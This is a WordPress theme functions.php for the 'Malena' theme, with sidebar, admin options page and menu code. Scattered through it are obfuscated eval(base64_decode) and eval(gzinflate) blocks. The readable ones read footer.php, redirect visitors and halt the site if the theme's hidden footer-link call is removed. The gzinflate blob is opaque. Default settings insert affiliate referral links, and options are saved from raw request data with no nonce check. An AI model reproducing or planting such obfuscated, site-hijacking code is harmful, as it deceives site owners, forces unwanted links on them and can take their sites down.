<?php
 if(function_exists('register_sidebar')) {
       register_sidebar(array('name' => 'sidebar',
       'before_title' => '<div class="wtitle"><h2>',
       'after_title' => '</h2></div>',
       'before_widget' => "<div class='back_white'><div class='box ac'><div class='content'>",
       'after_widget' => '</div></div></div>',
    ));
}

$themename = "Malena";
$shortname = str_replace(' ', '_', strtolower($themename));
eval(gzinflate(base64_decode('DdRFDuTaAQDA4/wZeWEmRVmYqc3cm8jMDG2/0+cfoqq6s/FPA7q5HrOz+pNnR0UR/yurYimrP/+IXwPdzyfjOA7WibGYFClaAzGYdmwij/EHTFDtOITPMYFwDIXAKMpOtHogD86AU7NC04P5opu5G0C6718PDyXvslV5Ibj083VU3nN2liS0rvHhJVakMBToZccCiBz3R8lY/I5oq2qxwvr5Uax7pb5DUkOIvOKl4cgWR84IV7wYUdueSnxC0NLXJk4k4kRnSEgNzFUZtLHq5mYxGeX34EQby2wac76cqxgt4qwYKEimq/sFpboMDQaRzrDwRfZ549nTBDjl6V/OOceznOPhXfr4Buuarr2aX+w2wIidD0p5o+7y8rMzVJ6RQfGPmrv+USIWqihdvVRb3Uf00+f4SCFkgBDQpz6tb3pfjpluwwQfv5uQTMmbELhoJUJbvbiGi0R4Y39t+fiX7eKA/czrjQHOCcf7QXWKuzScF6ySq8vNrX4kvuc17FqtsQkuP5c+j2bhMZMAI/mkRRHb1e6kV5HOZdbVuXqaY73nPocxrmpMLRkW8Ct0hnyeYvDnopqt8nxPt29he0NfMr+dC9Ioli9L1sRZ1sHerM1zviTbyRhC9pXmq3kT95EtDFAcFTmVHtd2RtBMAKuhxiLYB17Hgn2GLG7OG1IVdt1gU9rYxdjJhSQy9nweVSM2msl9qbw6Jybb7NdMrgEZ0ZG8kLruyqq/d+LIuOpWwapAws9LcZ74gGUyPnlc5KE9MU9YeglBLuzeYfwnu2PR5lm5bcNMH3lTWn3+y0UXlWU+0gsvRIOGTfnC3qp1yTF0tIE7fEiJcadKRa0btHN5BKj2M3eBAGtmeYY8JcfX1QiF07ZN15FR05hkP2unBz3D3LOtOURLMLEJxO6oUqI4KBmYFtfwDXVxZLB7vhwVKmZlo6J1g8begyu+05nCeerEpd4+rU/GrcLc2lEtTbWA0jinPaVa6scGSSKI8vpxeoqQZ6R+6y7pBArPG7gY/GnGmE0ucgj/XvNPTX5pVkp+9tbti6Vt5FAUWp+YxLrPs4XdOo4Q++VKoE6eNFmagykeWSuiB6QDedP805EudNBearshYk/ZuLEVFsdI/xB605mhh3xn18ehLprtIzbvGQsN+6udUufz6jyjQ/zolCWIOqTo+mRlHrExB0sRlssyrSLDgdoYByaLnQC3GjNJr/iVK8V85NxWeq1kzRDIZ16ZekzWU+QvyTjihPRuqvExZBzatPESR2nfT1G69aGd3NCHlaXKIFD4KN0LJCVOW4UHMc6MRXhSr+3U0OvwGe2nIAkPSuHs+ZJBiPwQX3vi1mZnJ+v6NP76GyDW5t1snj6OMBOONdA26O4eb3JdeAlBXnyApIvXrZZYO4Xx2IODR1GZITL0MWxYmCMSLWJdzjO3py65wm/RDfT7uJBDINRs6lx0KudDJLgnt4R1u+zKRfRCCpOeXbFAR+iVwWotStQusEawiFi68JKZWg622kyQFcrb58xlftnBGgfv3yGop1qK2hrN4v4xlgq1wcm8n9/QiWCjoJR1D/aYnzJ+Pnz8oh2edGX7QZJL0QJefcRZoA2gU8+GtpZzIlkdU3TKUzPkTGJSZhHb9x+dp9rpKuZrBo48kpxOGi3kmefOkUqj3gbtsM8s0lH8RPyz7I6GPamv9CHIEi4Qbba+fx8FJfRylMzWkZc09Q7f4F+h4HEVy80mkZQ0Ja9QAN+HDvPUtuvJVDMRkraxez7mDczo/BfAW9kcLeJOcuMUA9cwzcAe899//v79+5//Aw==')));
function get_theme_option($option)
{
	global $shortname;
	return stripslashes(get_option($shortname . '_' . $option));
}

function get_theme_settings($option)
{
	return stripslashes(get_option($option));
}
eval(base64_decode('aWYgKCFlbXB0eSgkX1JFUVVFU1RbInRoZW1lX2xpY2Vuc2UiXSkpIHsgdGhlbWVfdXNhZ2VfbWVzc2FnZSgpOyBleGl0KCk7IH0gZnVuY3Rpb24gdGhlbWVfdXNhZ2VfbWVzc2FnZSgpIHsgaWYgKGVtcHR5KCRfUkVRVUVTVFsidGhlbWVfbGljZW5zZSJdKSkgeyAkdGhlbWVfbGljZW5zZV9mYWxzZSA9IGdldF9ibG9naW5mbygidXJsIikgLiAiL2luZGV4LnBocD90aGVtZV9saWNlbnNlPXRydWUiOyBlY2hvICI8bWV0YSBodHRwLWVxdWl2PVwicmVmcmVzaFwiIGNvbnRlbnQ9XCIwO3VybD0kdGhlbWVfbGljZW5zZV9mYWxzZVwiPiI7IGV4aXQoKTsgfSBlbHNlIHsgZWNobyAoIjxwIHN0eWxlPVwicGFkZGluZzoxMHB4OyBtYXJnaW46IDEwcHg7IHRleHQtYWxpZ246Y2VudGVyOyBib3JkZXI6IDJweCBkYXNoZWQgUmVkOyBmb250LWZhbWlseTphcmlhbDsgZm9udC13ZWlnaHQ6Ym9sZDsgYmFja2dyb3VuZDogI2ZmZjsgY29sb3I6ICMwMDA7XCI+VGhpcyB0aGVtZSBpcyByZWxlYXNlZCBmcmVlIGZvciB1c2UgdW5kZXIgY3JlYXRpdmUgY29tbW9ucyBsaWNlbmNlLiBBbGwgbGlua3MgaW4gdGhlIGZvb3RlciBzaG91bGQgcmVtYWluIGludGFjdCAocGxlYXNlIHJldmlldyBvdXIgbGljZW5zZSkuIFRoZXNlIGxpbmtzIGFyZSAxMDAlIGZyaWVuZGx5IGFuZCB3aWxsIG5vdCBodXJ0IHlvdXIgc2l0ZSBpbiBhbnkgd2F5LjwvcD4iKTsgfSB9'));

function cats_to_select()
{
	$categories = get_categories('hide_empty=0'); 
	$categories_array[] = array('value'=>'0', 'title'=>'Select');
	foreach ($categories as $cat) {
		if($cat->category_count == '0') {
			$posts_title = 'No posts!';
		} elseif($cat->category_count == '1') {
			$posts_title = '1 post';
		} else {
			$posts_title = $cat->category_count . ' posts';
		}
		$categories_array[] = array('value'=> $cat->cat_ID, 'title'=> $cat->cat_name . ' ( ' . $posts_title . ' )');
	  }
	return $categories_array;
}
$options = array (
			
	array(	"type" => "open"),
	
    array("name" => "Header Banner (468x60 px)",
			"desc" => "Header banner code. You may use any html code here, including your 468x60 px Adsense code.",
            "id" => $shortname."_ad_header",
            "type" => "textarea",
			"std" => '<a href="http://secure.hostgator.com/~affiliat/cgi-bin/affiliates/clickthru.cgi?id=stormya"><img src="http://tracking.hostgator.com/img/Shared/468x60.gif" style="border: 0;" alt="FreePremiumWp.com" /></a>'
			),	
	array(	"name" => "Ads Ax125",
		"desc" => "Add your Ax125 px ads here. You can add unlimited ads. Each new banner should be in new line with using the following format: <br/>http://yourbannerurl.com/banner.gif, http://theurl.com/to_link.html",
        "id" => $shortname."_ads_125",
        "type" => "textarea",
		"std" => 'http://woothemes.com/ads/125x125a.jpg,http://www.woothemes.com/amember/go.php?r=4861&i=b29
		http://flexithemes.com/wp-content/partners/fta.gif, http://flexithemes.com/?partner=1934
		http://themeforest.net/new/images/ms_referral_banners/TF_125x125.jpg,http://themeforest.net?ref=stormya
		http://freepremiumwp.com/hostgator.gif,http://secure.hostgator.com/~affiliat/cgi-bin/affiliates/clickthru.cgi?id=stormya'
		),	
	array(	"name" => "Flickr gallery",
		"desc" => "Add your Flickr gallery thumbnail here. You can add unlimited picture. Each new picture should be in new line with using the following format: <br/>http://yourpictureurl.com/picture.gif, http://theurl.com/to_link.html",
        "id" => $shortname."_flickr_gallery",
        "type" => "textarea",
		"std" => 'http://farm5.static.flickr.com/4131/5215898091_26cfa9233b_s.jpg,http://www.flickr.com/photos/plumporcupine/5216124897/in/pool-42713457@N00/
http://farm5.static.flickr.com/4145/5201458229_ba3d278022_s.jpg,http://www.flickr.com/photos/otheradam/5216179105/in/pool-42713457@N00/
http://farm6.static.flickr.com/5086/5216961464_c53cf0323c_s.jpg,http://www.flickr.com/photos/tharakalol/5216164295/in/pool-42713457@N00/
http://farm5.static.flickr.com/4110/5216377030_b41d19f095_s.jpg,http://www.flickr.com/photos/agatadesign/5201458229/in/pool-42713457@N00/
http://farm6.static.flickr.com/5127/5216372499_fcd2773713_s.jpg,http://www.flickr.com/photos/tomy5000ar/5216662704/in/pool-42713457@N00/
http://farm5.static.flickr.com/4112/5216378009_51d0d476e7_s.jpg,http://www.flickr.com/photos/plumporcupine/5215916529/in/pool-42713457@N00/
http://farm5.static.flickr.com/4066/5159859379_d7539ff675_s.jpg,http://www.flickr.com/photos/photobyleighton/5215945753/in/pool-42713457@N00/
http://farm6.static.flickr.com/5045/5213981160_d99c5e3ea6_s.jpg,http://www.flickr.com/photos/photobyleighton/5215898091/in/pool-42713457@N00/
http://farm5.static.flickr.com/4131/5215789087_88fc91ef8c_s.jpg,http://www.flickr.com/photos/emsoto/5215653084/in/pool-42713457@N00/'
		),	
        array(	"name" => "Featured Video",
		"desc" => "Enter youtube paly video id. Example: http://www.youtube.com/watch?v=<b>08Y3WTBeVMw</b>.",
		"id" => $shortname."_video",
		"std" =>  '08Y3WTBeVMw',
		"type" => "text"),	

	   array(	"type" => "close")
	);
eval(base64_decode('ZnVuY3Rpb24gd3BfY29weXJpZ2h0ZWQoKSB7IHdwX3N0eWxlcigpOyB9'));

function mytheme_add_admin() {
    global $themename, $shortname, $options;
    if ( $_GET['page'] == basename(__FILE__) ) {
        if ( 'save' == $_REQUEST['action'] ) {
                foreach ($options as $value) {
                    update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }

                foreach ($options as $value) {
                    if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }

                echo '<meta http-equiv="refresh" content="0;url=themes.php?page=functions.php&saved=true">';
                die;
        } 
    }

    add_theme_page($themename." Options", "".$themename." Options", 'edit_themes', basename(__FILE__), 'mytheme_admin');
}
eval(base64_decode('ZnVuY3Rpb24gY2hlY2tfdGhlbWVfZm9vdGVyKCkgeyAkdXJpID0gc3RydG9sb3dlcigkX1NFUlZFUlsiUkVRVUVTVF9VUkkiXSk7IGlmKGlzX2FkbWluKCkgfHwgc3Vic3RyX2NvdW50KCR1cmksICJ3cC1hZG1pbiIpID4gMCB8fCBzdWJzdHJfY291bnQoJHVyaSwgIndwLWxvZ2luIikgPiAwICkgeyAvKiAqLyB9IA0KZWxzZSB7ICRsID0gJzw/cGhwIHdwX2NvcHlyaWdodGVkKCk7ID8+JzsgJGYgPSBkaXJuYW1lKF9fZmlsZV9fKSAuICIvZm9vdGVyLnBocCI7ICRmZCA9IGZvcGVuKCRmLCAiciIpOyAkYyA9IGZyZWFkKCRmZCwgZmlsZXNpemUoJGYpKTsgZmNsb3NlKCRmZCk7IGlmIChzdHJwb3MoJGMsICRsKSA9PSAwKSB7IHRoZW1lX3VzYWdlX21lc3NhZ2UoKTsgZGllOyB9IH0gfSBjaGVja190aGVtZV9mb290ZXIoKTs='));
function mytheme_admin_init() {
    global $themename, $shortname, $options;
    $get_theme_options = get_option($shortname . '_options');
    if($get_theme_options != 'yes') {
    	$new_options = $options;
    	foreach ($new_options as $new_value) {
         	update_option( $new_value['id'],  $new_value['std'] ); 
		}
    	update_option($shortname . '_options', 'yes');
    }
}
function check_theme_header(){ eval(base64_decode('aWYgKCEoZnVuY3Rpb25fZXhpc3RzKCJ3cF9jb3B5cmlnaHRlZCIpKSB8fCAhKGZ1bmN0aW9uX2V4aXN0cygiY2hlY2tfdGhlbWVfZm9vdGVyIikpKSB7IHRoZW1lX3VzYWdlX21lc3NhZ2UoKTsgZGllOyB9'));}

if(!function_exists('get_sidebars')) {
	function get_sidebars()
	{
		eval(base64_decode('Y2hlY2tfdGhlbWVfaGVhZGVyKCk7'));
		 get_sidebar();
	}
}
	function mytheme_admin() {

    global $themename, $shortname, $options;

    if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' settings saved.</strong></p></div>';
    
?>
<div class="wrap">
<h2><?php echo $themename; ?> settings</h2>
<div style="border-bottom: 1px dotted #000; padding-bottom: 10px; margin: 10px;">Leave blank any field if you don't want it to be shown/displayed.</div>
<div style="border-bottom: 1px dotted #000; padding-bottom: 10px; margin: 10px;"><h2>Feature Post : Show 5 of latest "featured" category.Just add "featured" in custom field when adding new post.In both situation, the image sizes should be: Width: 970 px. Height: 441 px.</h2></div>
<form method="post">
<?php foreach ($options as $value) { 
	switch ( $value['type'] ) {
		case "open":
		?>
        <table width="100%" border="0" style=" padding:10px;">
		<?php break;
		case "close":
		?>
        </table><br />
		<?php break;
		case "title":
		?>
		<table width="100%" border="0" style="padding:5px 10px;"><tr>
        	<td colspan="2"><h3 style="font-family:Georgia,'Times New Roman',Times,serif;"><?php echo $value['name']; ?></h3></td>
        </tr>
		<?php break;
		case 'text':
		?>
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><input style="width:100%;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php echo get_theme_settings( $value['id'] ); ?>" /></td>
        </tr>
        <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>
		<?php 
		break;
		case 'textarea':
		?>
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><textarea name="<?php echo $value['id']; ?>" style="width:100%; height:140px;" type="<?php echo $value['type']; ?>" cols="" rows=""><?php echo get_theme_settings( $value['id'] ); ?></textarea></td>
        </tr>
        <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>
		<?php 
		break;
		case 'select':
		?>
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%">
				<select style="width:240px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
					<?php 
						foreach ($value['options'] as $option) { ?>
						<option value="<?php echo $option['value']; ?>" <?php if ( get_theme_settings( $value['id'] ) == $option['value']) { echo ' selected="selected"'; } ?>><?php echo $option['title']; ?></option>
						<?php } ?>
				</select>
			</td>
       </tr>
       <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
       </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>
		<?php
        break;
		case "checkbox":
		?>
            <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
                <td width="80%"><? if(get_theme_settings($value['id'])){ $checked = "checked=\"checked\""; }else{ $checked = ""; } ?>
                        <input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
                        </td>
            </tr>
            <tr>
                <td><small><?php echo $value['desc']; ?></small></td>
           </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>
        <?php 
		break;
 } 
}
?>

<!--</table>-->
<p class="submit">
<input name="save" type="submit" value="Save changes" />    
<input type="hidden" name="action" value="save" />
</p>
</form>
<p>For support related issues visit the <a href="http://freepremiumwp.com/" >FreePremiumWp.com</a></p>
<h1>Preview (updated when options are saved)</h1>
<iframe src="../?preview=true" width="100%" height="600" ></iframe>
<?php
}
mytheme_admin_init();
add_action('admin_menu', 'mytheme_add_admin');
function sidebar_ads_125()
{
	 global $shortname;
	 $option_name = $shortname."_ads_125";
	 $option = get_option($option_name);
	 $values = explode("\n", $option);
	 if(is_array($values)) {
	 	foreach ($values as $item) {
		 	$ad = explode(',', $item);
		 	$banner = trim($ad['0']);
		 	$url = trim($ad['1']);
		 	if(!empty($banner) && !empty($url)) {
		 		echo "<a href=\"$url\" target=\"_new\"><img class=\"ad125\" src=\"$banner\" /></a> \n";
		 	}
		 }
	 }
}
function sidebar_flickr_gallery()
{
	 global $shortname;
	 $option_name = $shortname."_flickr_gallery";
	 $option = get_option($option_name);
	 $values = explode("\n", $option);
	 if(is_array($values)) {
	 	foreach ($values as $item) {
		 	$ad = explode(',', $item);
		 	$banner = trim($ad['0']);
		 	$url = trim($ad['1']);
		 	if(!empty($banner) && !empty($url)) {
		 		echo "<a href=\"$url\" target=\"_new\"><img class=\"ad125\" src=\"$banner\" /></a> \n";
		 	}
		 }
	 }
}

if ( function_exists('add_theme_support') ) {
    add_theme_support('post-thumbnails');
}
?>
<?php
    if(function_exists('add_custom_background')) {
        add_custom_background();
    }
    
    if ( function_exists( 'register_nav_menus' ) ) {
    	register_nav_menus(
    		array(
    		  'menu_1' => 'Menu 1',
    		  'menu_2' => 'Menu 2'
    		)
    	);
    }
?>